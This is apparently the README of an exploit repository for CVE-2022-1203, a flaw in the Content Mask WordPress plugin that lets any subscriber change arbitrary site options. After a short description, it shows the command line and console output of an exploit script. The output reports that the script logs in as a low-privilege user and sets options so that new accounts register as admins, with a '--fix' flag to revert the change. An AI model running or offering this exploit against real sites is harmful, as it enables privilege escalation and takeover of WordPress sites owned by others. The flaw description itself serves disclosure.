# CVE-2022-1203
Content Mask &lt; 1.8.4 - Subscriber+ Arbitrary Options Update

## Description

The Content Mask WordPress plugin before 1.8.4.1 does not have authorisation and CSRF checks in various AJAX actions, as well as does not validate the option to be updated to ensure it belongs to the plugin. As a result, any authenticated user, such as subscriber could modify arbitrary blog options


## How to use

Exploit
---
```

$ python3 CVE-2022-1203.py -u http://wordpress.lan -un user -p useruser1
The plugin version is below 1.8.3.2.
The plugin version is 1.8.3.2
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
You can now register a user as an admin user. Remember to run --fix yes after you have registered to prevent others exploiting the site.
```

Fix
---
```
python3 CVE-2022-1203.py -u http://wordpress.lan -un user -p useruser1 --fix yes
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Fixed: You can not longer register

```
